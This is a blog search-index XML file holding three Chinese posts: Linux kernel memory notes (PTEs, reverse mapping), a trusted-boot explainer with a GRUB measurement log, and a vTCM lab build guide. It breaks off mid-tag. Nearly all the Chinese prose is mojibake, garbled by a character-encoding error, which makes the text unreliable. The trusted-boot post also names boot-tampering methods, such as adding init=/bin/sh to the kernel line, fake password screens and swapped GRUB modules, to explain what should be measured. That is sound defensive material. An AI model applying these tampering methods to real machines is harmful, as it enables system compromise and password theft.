<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>linuxå†…æ ¸å­¦ä¹ </title>
    <link href="/2025/11/13/linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/11/13/linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="é¡µ">é¡µ</h1><h2 id="é¡µè¡¨é¡¹ï¼ˆPTEï¼‰">é¡µè¡¨é¡¹ï¼ˆPTEï¼‰</h2><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251113165506677.png" alt="image-20251113165506677"></p><p>æ‹†è§£ååˆ†ä¸¤éƒ¨åˆ†ï¼š</p><h3 id="1-PFNï¼ˆç‰©ç†é¡µå·ï¼‰">(1) PFNï¼ˆç‰©ç†é¡µå·ï¼‰</h3><p>å°±æ˜¯å“ªä¸ªç‰©ç†é¡µï¼Œå­˜æ”¾åœ¨ PTE çš„é«˜ 52 ä½ï¼ˆç»†èŠ‚ä¾èµ– CPUï¼‰ã€‚</p><p>ç‰©ç†åœ°å€ = PFN &lt;&lt; 12<br>ï¼ˆå› ä¸ºæ¯é¡µ 4KBï¼‰</p><h3 id="2-flag-bitsï¼ˆæƒé™-çŠ¶æ€ä½ï¼‰">(2) flag bitsï¼ˆæƒé™/çŠ¶æ€ä½ï¼‰</h3><p>å¸¸è§çš„æ ‡å¿—ä½åŒ…æ‹¬ï¼š</p><table><thead><tr><th>ä½</th><th>åç§°</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>P</td><td>Present</td><td>æ˜¯å¦åœ¨å†…å­˜ä¸­</td></tr><tr><td>R/W</td><td>å¯å†™</td><td>æ˜¯å¦å…è®¸å†™</td></tr><tr><td>U/S</td><td>ç”¨æˆ·æ€/å†…æ ¸æ€</td><td>æ˜¯å¦å…è®¸ç”¨æˆ·æ€è®¿é—®</td></tr><tr><td>NX</td><td>Non-Execute</td><td>æ˜¯å¦ç¦æ­¢æ‰§è¡Œ</td></tr><tr><td>A</td><td>Accessed</td><td>æ˜¯å¦è¢«è®¿é—®</td></tr><tr><td>D</td><td>Dirty</td><td>æ˜¯å¦è¢«å†™è¿‡</td></tr><tr><td>PAT</td><td>caching mode</td><td>ç¼“å­˜ç­–ç•¥</td></tr><tr><td>Global</td><td>å…¨å±€é¡µ</td><td>TLB ä¸ä¼šåœ¨åˆ‡æ¢ CR3 æ—¶åˆ·æ–°</td></tr><tr><td>COW</td><td><em>Linuxè½¯ä»¶å±‚æ ‡å¿—</em></td><td>å†™æ—¶å¤åˆ¶ï¼Œå†…æ ¸ç»„ç»‡åœ¨æ›´é«˜å±‚ meta ä¿¡æ¯</td></tr></tbody></table><p><strong>è¿™äº›ä½è®© CPU çŸ¥é“å¦‚ä½•å¤„ç†å¯¹è¯¥é¡µçš„å†…å­˜è®¿é—®ã€‚</strong></p><p>ä¾‹ï¼š<br>PTE ä¸­ R/W=0 â†’ é¡µåªè¯»<br>PTE ä¸­ NX=1 â†’ é¡µä¸å¯æ‰§è¡Œ<br>PTE ä¸­ Present=0 â†’ é¡µä¸åœ¨å†…å­˜ï¼Œå¼•å‘ page faultï¼Œä» swap/load-in å†å¡«å……é¡µè¡¨</p><h2 id="åå‘æ˜ å°„-RMAP-æŠ€æœ¯">åå‘æ˜ å°„(RMAP)æŠ€æœ¯</h2><h3 id="åŸºæœ¬æ¦‚å¿µ">åŸºæœ¬æ¦‚å¿µ</h3><ul><li><p><strong>æ­£å‘æ˜ å°„</strong></p><p>å½“è¿›ç¨‹åˆ†é…å†…å­˜å¹¶å‘ç”Ÿå†™æ“ä½œæ—¶ï¼Œä¼šåˆ†é…è™šæ‹Ÿåœ°å€å¹¶äº§ç”Ÿç¼ºé¡µ,è¿›è€Œåˆ†é…ç‰©ç†å†…å­˜å¹¶å»ºç«‹è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€çš„æ˜ å°„å…³ç³»ï¼Œ è¿™ä¸ªå«æ­£å‘æ˜ å°„ã€‚</p></li><li><p><strong>åå‘æ˜ å°„</strong></p><p>åè¿‡æ¥ï¼Œ é€šè¿‡ç‰©ç†é¡µé¢æ‰¾åˆ°æ˜ å°„å®ƒçš„æ‰€æœ‰è™šæ‹Ÿé¡µé¢å«åå‘æ˜ å°„ï¼ˆreverse-mapping, RMAPï¼‰ã€‚</p></li></ul><blockquote><p>ä¸ºä»€ä¹ˆéœ€è¦åå‘æ˜ å°„ï¼Ÿ ä¸»è¦æ˜¯ä¸ºäº†å†…å­˜å›æ”¶ã€‚åœ¨æ“ä½œç³»ç»Ÿä¸­ï¼Œå¤šä¸ªè¿›ç¨‹çš„è™šæ‹Ÿåœ°å€å¯èƒ½æ˜ å°„åˆ°åŒä¸€ä¸ªç‰©ç†é¡µï¼ˆä¾‹å¦‚å…±äº«å†…å­˜ã€å†™æ—¶å¤åˆ¶ç­‰ï¼‰ã€‚å½“å†…æ ¸éœ€è¦å›æ”¶ä¸€ä¸ªç‰©ç†é¡µæ—¶ï¼Œå®ƒå¿…é¡»ä¿®æ”¹æ‰€æœ‰æ˜ å°„äº†è¯¥é¡µçš„é¡µè¡¨é¡¹ï¼Œä½¿å…¶æ— æ•ˆæˆ–æŒ‡å‘å…¶ä»–ä½ç½®ã€‚å¦‚æœæ²¡æœ‰åå‘æ˜ å°„ï¼Œå†…æ ¸å°†ä¸å¾—ä¸éå†æ‰€æœ‰è¿›ç¨‹çš„é¡µè¡¨æ¥å¯»æ‰¾æ˜ å°„ï¼Œè¿™æ˜¯æå…¶ä½æ•ˆçš„ã€‚</p></blockquote><p><strong>Linux2.4æ²¡æœ‰åå‘æ˜ å°„</strong><br>åœ¨linux2.4å†…æ ¸ä¸­æ²¡æœ‰åå‘æ˜ å°„çš„è¿™ä¸ªæ¦‚å¿µï¼Œå½“æ—¶ä¸ºäº†æ‰¾åˆ°ä¸€ä¸ªç‰©ç†é¡µé¢å¯¹åº”çš„é¡µè¡¨é¡¹å°±éœ€è¦éå†ç³»ç»Ÿä¸­æ‰€æœ‰çš„mmç»„æˆçš„é“¾è¡¨ï¼Œç„¶åå†éå†æ¯ä¸€ä¸ªmmçš„æ¯ä¸€ä¸ªvmaçœ‹è¿™ä¸ªvmaæ˜¯å¦æ˜ å°„äº†è¿™é¡µï¼Œè¿™ä¸ªè¿‡ç¨‹ç›¸å½“ä½æ•ˆï¼Œæœ€åæƒ…å†µä¸å¾—ä¸éå†å®Œæ‰€æœ‰çš„mmç„¶åæ‰èƒ½æ‰¾æ˜ å°„åˆ°è¿™ä¸ªé¡µçš„æ‰€æœ‰pteã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¯ä¿¡å¯åŠ¨æµç¨‹</title>
    <link href="/2025/11/05/%E5%8F%AF%E4%BF%A1%E5%90%AF%E5%8A%A8%E4%B8%8E%E5%9F%BA%E5%87%86%E5%80%BC/"/>
    <url>/2025/11/05/%E5%8F%AF%E4%BF%A1%E5%90%AF%E5%8A%A8%E4%B8%8E%E5%9F%BA%E5%87%86%E5%80%BC/</url>
    
    <content type="html"><![CDATA[<h1 id="å¯ä¿¡å¯åŠ¨">å¯ä¿¡å¯åŠ¨</h1><h2 id="åŸºå‡†å€¼">åŸºå‡†å€¼</h2><p>åœ¨ä¸€äº›ç¡¬ä»¶å¹³å°çš„å®ç°ä¸­ï¼Œ<strong>åˆå§‹å¹³å°åº¦é‡å€¼</strong>ç”¨æ¥è¡¨ç¤ºå¹³å°é¦–æ¬¡å¯åŠ¨æ—¶çš„åº¦é‡åŸºçº¿ï¼Œè¿™äº›åˆå§‹å€¼æ˜¯ç”±ç¡¬ä»¶å‚å•†æˆ–ç³»ç»Ÿé›†æˆå•†é¢„è®¾çš„ï¼Œé€šå¸¸å­˜å‚¨åœ¨TPMçš„<strong>éæ˜“å¤±æ€§å­˜å‚¨åŒº</strong>ä¸­ã€‚</p><h3 id="TCGè§„èŒƒ">TCGè§„èŒƒ</h3><h4 id="ã€ŠTCG-PC-Client-Platform-Firmware-Profile-Specificationã€‹">ã€Š<strong>TCG PC Client Platform Firmware Profile Specification</strong>ã€‹</h4><ul><li><p>ç« èŠ‚ï¼š<strong>7.4.1 Root of Trust for Measurement (RTM)</strong></p><blockquote><p>â€œThe RTM is the component that performs the first measurement and extends it into a Platform Configuration Register (PCR).<br>The firmware code and configuration used by the RTM are defined at manufacture time and cannot be modified post-manufacture except by an authorized update process.â€</p></blockquote><p>ç¬¬ä¸€æ¬¡åº¦é‡åŠ¨ä½œï¼ˆæµ‹é‡ Boot Blockï¼‰ç”± <strong>å‡ºå‚æ—¶å®šä¹‰çš„ä»£ç æ‰§è¡Œ</strong>ï¼›</p><p>è¯¥ä»£ç åŠå…¶åŸºå‡†ï¼ˆå³è¢«ä¿¡ä»»çš„åˆå§‹å“ˆå¸Œæˆ–ç­¾åå…¬é’¥ï¼‰åœ¨<strong>åˆ¶é€ é˜¶æ®µå†™å…¥</strong>ï¼›</p><p>åç»­ä¸å¯éšæ„æ›´æ”¹ï¼Œé™¤éæœ‰æˆæƒæ›´æ–°ï¼ˆå‚å•†ç­¾åæ›´æ–° BIOSï¼‰ã€‚</p></li></ul><h3 id="å›½å®¶æ ‡å‡†">å›½å®¶æ ‡å‡†</h3><h4 id="ã€ŠGM-T-0054-2018-å¯ä¿¡è®¡ç®—å¹³å°-è½¯ä»¶åº¦é‡ä¸éªŒè¯è§„èŒƒã€‹">ã€Š<strong>GM/T 0054-2018 å¯ä¿¡è®¡ç®—å¹³å° è½¯ä»¶åº¦é‡ä¸éªŒè¯è§„èŒƒ</strong>ã€‹</h4><ul><li><p>ç¬¬6ç« ï¼š</p><blockquote><p>â€œå¯ä¿¡åŸºå‡†å€¼ç”±å¯ä¿¡è½¯ä»¶å‘å¸ƒè€…æˆ–å¹³å°æä¾›è€…åœ¨å—æ§ç¯å¢ƒä¸‹è®¡ç®—äº§ç”Ÿï¼Œå¹¶åœ¨å¹³å°ç”Ÿäº§æˆ–åˆå§‹åŒ–é˜¶æ®µå†™å…¥å¯ä¿¡å¹³å°æ§åˆ¶æ¨¡å—æˆ–å›ºä»¶ä¸­ã€‚â€</p></blockquote></li></ul><p>è¿™äº›æ ‡å‡†è¦æ±‚åœ¨<strong>è®¾å¤‡åˆ¶é€ æ—¶</strong>é€šè¿‡<strong>ç¡¬ä»¶ä¿¡ä»»æ ¹</strong>ï¼ˆä¾‹å¦‚èŠ¯ç‰‡å†…çš„åŠ å¯†å¯†é’¥å’Œè¯ä¹¦ï¼‰è¿›è¡Œæœ€åˆçš„åŸºå‡†å€¼å†™å…¥ï¼Œåç»­å¯åŠ¨è¿‡ç¨‹ä¸­çš„æ‰€æœ‰åº¦é‡å€¼éƒ½å°†ä¸è¿™äº›é¢„è®¾çš„åŸºå‡†å€¼è¿›è¡Œæ¯”å¯¹ã€‚</p><h3 id="ç¡¬ä»¶å‚å•†æ ‡å‡†">ç¡¬ä»¶å‚å•†æ ‡å‡†</h3><h4 id="Intel-BootGuard-Specification"><strong>Intel BootGuard Specification</strong></h4><blockquote><p>â€œPlatform owners or OEMs fuse the Boot Policy Manifest (BPM) and hash of the BIOS public key into the Platform Controller Hub (PCH) Field Programmable Fuses (FPFs) at manufacturing time.â€</p></blockquote><h3 id="AMD-Platform-Security-Processor-PSP"><strong>AMD Platform Security Processor (PSP)</strong></h3><blockquote><p>â€œThe PSP verifies the initial BIOS image using a public key hash fused at manufacturing.<br>The key hash is programmed into the SoC fuses and cannot be modified after fabrication.â€</p></blockquote><h2 id="ç³»ç»Ÿå¯åŠ¨æµç¨‹">ç³»ç»Ÿå¯åŠ¨æµç¨‹</h2><p>PSPæ ¸å¯åŠ¨ååŠ è½½PSPçš„bootloaderï¼Œç”±bootloaderåšå„ç§åˆå§‹åŒ–ï¼ŒéšåBootLoader</p><h2 id="å…³é”®ç»„ä»¶å’Œä»£ç åº¦é‡">å…³é”®ç»„ä»¶å’Œä»£ç åº¦é‡</h2><table><thead><tr><th style="text-align:center">å…³é”®ç»„ä»¶</th></tr></thead><tbody><tr><td style="text-align:center">BIOS/U-BOOT</td></tr><tr><td style="text-align:center">PciRoot(0x0)/Pci(0x8,0x1)/Pci(0x0,0x2)/Sata(0x6,0xFFFF,0x0)/HD(1,GPT,D43E84F4-0E97-4488-91B3-8A727A8A9572,0x800,0x100000)/\EFI\ubuntu\grubx64.efi</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/normal.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/terminal.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/crypto.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/bufio.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/extcmd.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/boot.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/gettext.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/gzio.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/command.lst</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/fs.lst</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/crypto.lst</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/terminal.lst</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/grub.cfg</td></tr><tr><td style="text-align:center">grub_cmd: [ -s (hd1,gpt3)/boot/grub/grubenv ]</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/test.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/grubenv</td></tr><tr><td style="text-align:center">grub_cmd: load_env</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/loadenv.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/disk.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/grubenv</td></tr><tr><td style="text-align:center">grub_cmd: [  ]</td></tr><tr><td style="text-align:center">grub_cmd: set default=Advanced options for Ubuntu</td></tr><tr><td style="text-align:center">grub_cmd: [ xy = xy ]</td></tr><tr><td style="text-align:center">grub_cmd: menuentry_id_option=â€“id</td></tr><tr><td style="text-align:center">grub_cmd: export menuentry_id_option</td></tr><tr><td style="text-align:center">grub_cmd: font=unicode</td></tr><tr><td style="text-align:center">grub_cmd: loadfont unicode</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/font.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/video.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/fonts/unicode.pf2</td></tr><tr><td style="text-align:center">grub_cmd: set gfxmode=auto</td></tr><tr><td style="text-align:center">grub_cmd: load_video</td></tr><tr><td style="text-align:center">grub_cmd: insmod all_video</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/all_video.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/efi_gop.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/video_fb.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/efi_uga.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/video_bochs.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/video_cirrus.mod</td></tr><tr><td style="text-align:center">grub_cmd: insmod gfxterm</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/gfxterm.mod</td></tr><tr><td style="text-align:center">grub_cmd: set locale_dir=(hd1,gpt3)/boot/grub/local</td></tr><tr><td style="text-align:center">grub_cmd: set lang=en_US</td></tr><tr><td style="text-align:center">grub_cmd: insmod gettext</td></tr><tr><td style="text-align:center">grub_cmd: terminal_output gfxterm</td></tr><tr><td style="text-align:center">grub_cmd: set timeout_style=hidden</td></tr><tr><td style="text-align:center">grub_cmd: set timeout=2</td></tr><tr><td style="text-align:center">grub_cmd: [ -f (hd1,gpt3)/boot/grub/custom.cfg ]</td></tr><tr><td style="text-align:center">grub_cmd: setparams Advanced options for Ubuntu GN</td></tr><tr><td style="text-align:center">grub_cmd: setparams Ubuntu GNU/Linux, with Linux 5</td></tr><tr><td style="text-align:center">grub_cmd: load_video</td></tr><tr><td style="text-align:center">grub_cmd: insmod all_video</td></tr><tr><td style="text-align:center">grub_cmd: set gfxpayload=keep</td></tr><tr><td style="text-align:center">grub_cmd: insmod gzio</td></tr><tr><td style="text-align:center">grub_cmd: insmod part_gpt</td></tr><tr><td style="text-align:center">grub_cmd: insmod ext2</td></tr><tr><td style="text-align:center">grub_cmd: set root=hd0,gpt3</td></tr><tr><td style="text-align:center">grub_cmd: search --no-floppy --fs-uuid --set=root</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/search.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/search_fs_uuid.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/search_fs_file.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/search_label.mod</td></tr><tr><td style="text-align:center">grub_cmd: echo Loading Linux 5.10.112-hygon â€¦</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/echo.mod</td></tr><tr><td style="text-align:center">grub_cmd: linux /boot/vmlinuz-5.10.112-hygon root=UUID</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/linux.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/relocator.mod</td></tr><tr><td style="text-align:center">(hd1,gpt3)/boot/grub/x86_64-efi/mmap.mod</td></tr><tr><td style="text-align:center">/boot/vmlinuz-5.10.112-hygon</td></tr><tr><td style="text-align:center">kernel_cmdline: /boot/vmlinuz-5.10.112-hygon root=</td></tr><tr><td style="text-align:center">grub_cmd: echo Loading initial ramdisk â€¦</td></tr><tr><td style="text-align:center">grub_cmd: initrd /boot/initrd.img-5.10.112-hygon</td></tr><tr><td style="text-align:center">/boot/initrd.img-5.10.112-hygon</td></tr><tr><td style="text-align:center"></td></tr></tbody></table><p><strong>1) å›ºä»¶ä¸è®¾å¤‡è·¯å¾„ï¼ˆä¸Šç”µ â†’ å›ºä»¶ï¼‰</strong></p><p>ä¸»æ¿å›ºä»¶ï¼ˆBIOS/UEFI æˆ– U-Bootï¼‰å¯åŠ¨åä¼šåšç¡¬ä»¶åˆå§‹åŒ–ï¼ˆCPUã€å†…å­˜ã€PCI æ€»çº¿ã€å­˜å‚¨æ§åˆ¶å™¨ï¼‰ï¼Œç„¶åæŒ‰å›ºä»¶é…ç½®é€‰æ‹©ä¸€ä¸ªè®¾å¤‡ï¼ˆæ¯”å¦‚å“ªä¸ª SATA ç«¯å£ã€å“ªä¸ª NVMeï¼‰æ¥è¯»å–å¹¶æ‰§è¡Œç¬¬ä¸€çº§å¼•å¯¼ç¨‹åºï¼ˆä¾‹å¦‚ EFI ä¸‹çš„ bootloaderï¼‰ã€‚å›ºä»¶è¿˜å¯èƒ½éªŒè¯å¼•å¯¼ç¨‹åºç­¾åï¼ˆSecure Bootï¼‰æˆ–æŒ‰å¯åŠ¨é¡ºåºé€‰æ‹©è®¾å¤‡ã€‚ ä¸Šç”µåè·‘çš„ä»£ç æ˜¯ BIOS/UEFI æˆ– U-Bootï¼Œå®ƒå†³å®šä»å“ªå—ç›˜ã€å“ªæ¡æ€»çº¿æŠŠå¼•å¯¼å™¨æ‹‰èµ·æ¥ã€‚å›ºä»¶è¢«æ”¹äº†ï¼Œåé¢æ‰€æœ‰ä¸œè¥¿éƒ½å¯èƒ½æ˜¯å‡è±¡ã€‚<code>BIOS/U-BOOT</code>ã€<code>PciRoot(...)/Sata(...)</code>ã€<code>(hd1,gpt3)</code> å°±æ˜¯è¿™ä¸ªå±‚é¢çš„æ–‡ä»¶ã€‚</p><p><strong>2) åŠ è½½grubæœ¬ä½“</strong></p><p>å›ºä»¶æŠŠ GRUB çš„ä¸»å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆä¾‹å¦‚ <code>EFI/BOOT/grubx64.efi</code> æˆ– <code>/boot/efi/.../grubx64.efi</code>ï¼‰è½½å…¥å†…å­˜å¹¶è¿è¡Œã€‚è¿™ä¸€æ­¥ä¼šæŠŠ GRUB çš„åŸºç¡€æ‰§è¡Œç¯å¢ƒå»ºç«‹èµ·æ¥ï¼Œå‡†å¤‡åŠ è½½ GRUB çš„æ¨¡å—å’Œé…ç½®æ–‡ä»¶ã€‚æ›¿æ¢è¿™ä¸ªæ–‡ä»¶æˆ–å®ƒçš„ç­¾åä¼šå¯¼è‡´åç»­çš„å¯åŠ¨ç”šè‡³ä¸æ˜¯å¯åŠ¨ç”¨æˆ·è‡ªå·±çš„æ“ä½œç³»ç»Ÿã€‚è¦åº¦é‡çš„æ˜¯ EFI ä¸‹çš„ grub äºŒè¿›åˆ¶å’Œæœ€æ—©è¢«åŠ è½½çš„æ¨¡å—ï¼ˆ <code>.../boot/grub/x86_64-efi/...</code> ï¼‰ã€‚</p><p><strong>3) GRUB æ¨¡å—åŠ è½½</strong></p><p>GRUB çš„å¾ˆå¤šåŠŸèƒ½å¹¶éå†…å»ºåœ¨ä¸€ä¸ªå·¨å¤§çš„å•ä½“ç¨‹åºé‡Œï¼Œè€Œæ˜¯ä»¥æ¨¡å—ï¼ˆ<code>.mod</code> æ–‡ä»¶ï¼‰å½¢å¼å­˜åœ¨ã€‚ä¸¾ä¾‹ï¼š<code>ext2</code> æ¨¡å—å®ç°è¯»å– ext åˆ†åŒºï¼Œ<code>search_fs_uuid.mod</code> å®ç°æŒ‰ UUID æŸ¥åˆ†åŒºï¼Œ<code>linux.mod</code> å®ç°æŠŠå†…æ ¸æ˜ åƒåŠ è½½åˆ°å†…å­˜ï¼Œ<code>crypto.mod</code> å®ç°åŠ å¯†/è§£å¯†æ”¯æŒï¼Œ<code>gzio.mod</code> å®ç° gzip è§£å‹ã€‚GRUB å¯åŠ¨æ—¶æŒ‰éœ€ <code>insmod</code>ï¼ˆåŠ è½½ï¼‰è¿™äº›æ¨¡å—æ¥å®Œæˆå…·ä½“åŠ¨ä½œã€‚</p><p>æ¨¡å—è¢«æ›¿æ¢èƒ½åœ¨å¾ˆæ—©å°±æ³¨å…¥æ¶æ„è¡Œä¸ºï¼Œå…¸å‹æ–‡ä»¶æœ‰ <code>linux.mod</code>, <code>disk.mod</code>, <code>search.mod</code>, <code>crypto.mod</code>, <code>gzio.mod</code>, <code>gfxterm.mod</code> ç­‰ã€‚</p><p><strong>4) é…ç½®ä¸ç¯å¢ƒï¼ˆgrub.cfg / grubenvï¼‰</strong><br>å®é™…è¦åšä»€ä¹ˆã€ç”¨ä»€ä¹ˆå‚æ•°å¯åŠ¨ï¼Œè¿™äº›éƒ½å†™åœ¨ <code>grub.cfg</code> æˆ– <code>grubenv</code>ã€‚æ”»å‡»è€…å¸¸ç”¨çš„æ‰‹æ³•ä¸æ˜¯æ”¹äºŒè¿›åˆ¶ï¼Œè€Œæ˜¯æ”¹è„šæœ¬ï¼šå·å·åŠ ä¸€æ¡èœå•ã€åœ¨ kernel è¡ŒåŠ  <code>init=/bin/sh</code>ã€‚æ‰€ä»¥æŠŠè¿™äº›æ–‡æœ¬æ–‡ä»¶å’Œ GRUB åœ¨å¯åŠ¨æ—¶æ‰§è¡Œçš„å‘½ä»¤è®°å½•å½“åšåº¦é‡å¯¹è±¡å¾ˆé‡è¦ã€‚</p><p><strong>5) å®šä½ä¸è¯»å–ï¼ˆsearch / filesystemï¼‰</strong><br>GRUB è¦å…ˆæ‰¾åˆ°ä¸€ä¸ªåˆ†åŒºå†å»è¯»æ–‡ä»¶ã€‚<code>search --fs-uuid</code>ã€part/FS æ¨¡å—ï¼ˆ<code>part_gpt</code>ã€<code>ext2</code>ï¼‰å’Œè·¯å¾„ <code>(hd1,gpt3)/boot/...</code> æ˜¯è¿™ä¸€å±‚çš„å…³é”®ã€‚è¿™é‡Œè¢«å¹²çš„æœ€ç®€å•ä¹Ÿæœ€å¸¸è§ï¼šæ¢ç›˜ã€æ›¿æ¢ <code>/boot/vmlinuz</code> æˆ– <code>/boot/initrd</code>ã€‚åº¦é‡ç£ç›˜è·¯å¾„ã€search æ¨¡å—å’Œç›˜ä¸Šè¿™äº›æ–‡ä»¶ï¼Œæ˜¯æ£€æµ‹æ–‡ä»¶çº§ç¯¡æ”¹çš„å¿…åšäº‹ã€‚</p><p><strong>6) å†…æ ¸ä¸ initrdï¼ˆæƒåŠ›ç§»äº¤ç‚¹ï¼‰</strong><br>å½“ GRUB æŠŠå†…æ ¸ï¼ˆ<code>vmlinuz-*</code>ï¼‰å’Œ initrdï¼ˆ<code>initrd.img-*</code>ï¼‰åŠ è½½å¹¶æŠŠå‘½ä»¤è¡Œäº¤ç»™å®ƒä»¬ï¼Œæ§åˆ¶æƒå°±è½¬äº¤äº†ã€‚å†…æ ¸æˆ– initrd è¢«æ”¹ï¼Œç³»ç»ŸåŸºæœ¬å®Œè›‹ã€‚ä¸€å®šè¦åº¦é‡å†…æ ¸æ˜ åƒã€initrd å’Œè´Ÿè´£åŠ è½½å®ƒä»¬çš„æ¨¡å—ï¼ˆ<code>relocator.mod</code>/<code>mmap.mod</code> ç­‰ï¼‰ã€‚</p><p><strong>7) è§£å¯†/UI/æ—©æœŸè„šæœ¬ï¼ˆinitrdã€cryptoã€å­—ä½“ï¼‰</strong><br>å¦‚æœæœ‰åŠ å¯†ç›˜ï¼ŒGRUB æˆ– initrd é‡Œä¼šæœ‰è§£å¯†é€»è¾‘ï¼›åŒæ—¶æ—©æœŸç•Œé¢ï¼ˆ<code>gfxterm</code>, <code>terminal</code>, å­—ä½“ã€<code>gettext</code>ï¼‰æ˜¯ç”¨æˆ·è¾“å…¥å¯†ç çš„ç‚¹ã€‚æ”»å‡»è€…å¸¸æŠŠè¿™ä¸¤è€…ç»“åˆï¼šä¼ªé€ ç•Œé¢è®°å½•å¯†ç æˆ–ç”¨å‡ crypto æ¨¡å—ç»•è¿‡è§£å¯†ã€‚åº¦é‡è¿™äº›ç»„ä»¶èƒ½é˜²æ­¢å£ä»¤æ³„éœ²ä¸è§£å¯†è¢«ç¯¡æ”¹ã€‚</p><h1 id="å®‰å…¨å¯åŠ¨">å®‰å…¨å¯åŠ¨</h1>]]></content>
    
    
    
    <tags>
      
      <tag>å¯ä¿¡å¯åŠ¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è™šæ‹Ÿå¯ä¿¡æ ¹å®éªŒ</title>
    <link href="/2025/10/17/%E8%99%9A%E6%8B%9F%E5%8F%AF%E4%BF%A1%E6%A0%B9%E5%AE%9E%E9%AA%8C/"/>
    <url>/2025/10/17/%E8%99%9A%E6%8B%9F%E5%8F%AF%E4%BF%A1%E6%A0%B9%E5%AE%9E%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="swtpm">swtpm</h1><h1 id="vTCM">vTCM</h1><p>æ–°å»ºä¸€ä¸ªé¡¹ç›®æ ¹ç›®å½•ï¼Œæˆ‘çš„é¡¹ç›®æ ¹ç›®å½•ä¸º/opt/build_vtcm/vtcmã€‚</p><p>å…ˆæŠŠcube-1.3ã€cube-tcmå’Œgm_sm2_masterå…‹éš†åˆ°é¡¹ç›®æ ¹ç›®å½•</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://gitee.com/biparadox/cube-1.3.git<br>git clone https://gitee.com/biparadox/cube-tcm.git<br>git clone https://github.com/TCLab-BJUT/gm_sm2.git<br></code></pre></td></tr></table></figure><p>æ ¹æ®ã€Štcmå·¥ç¨‹åˆæ­¥ã€‹ä¸­æ‰€è¯´ï¼Œcube-tcm çš„ç¯å¢ƒå˜é‡è®¾ç½®æ–¹æ³•å¿…é¡»åœ¨cube-1.3çš„ç¯å¢ƒå˜é‡è®¾ç½®å®Œæˆåè¿›è¡Œï¼Œ è®¾ç½®æ–¹æ³•ç±»ä¼¼ï¼Œè„šæœ¬æ‰§è¡Œåï¼Œä¼šä¿®æ”¹CUBEAPPPATHå’ŒCUBE_APP_PLUGIN åˆ°vtcm-1.12å·¥ä½œç›®å½•ã€‚ç¼–è¯‘å‰éœ€å®Œæˆå›½å¯†ç®—æ³•åº“æ–‡ä»¶çš„å¤åˆ¶å’Œç¯å¢ƒå˜é‡çš„è®¾ç½®ã€‚</p><h2 id="å›½å¯†ç®—æ³•åŒ…ç¼–è¯‘">å›½å¯†ç®—æ³•åŒ…ç¼–è¯‘</h2><p>è¿›å…¥gm_sm2ç›®å½•åï¼Œæ‰§è¡Œå‘½ä»¤ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd gm_sm2<br>make<br></code></pre></td></tr></table></figure><p>è§‚å¯Ÿgm_sm2/binç›®å½•ï¼Œ<a 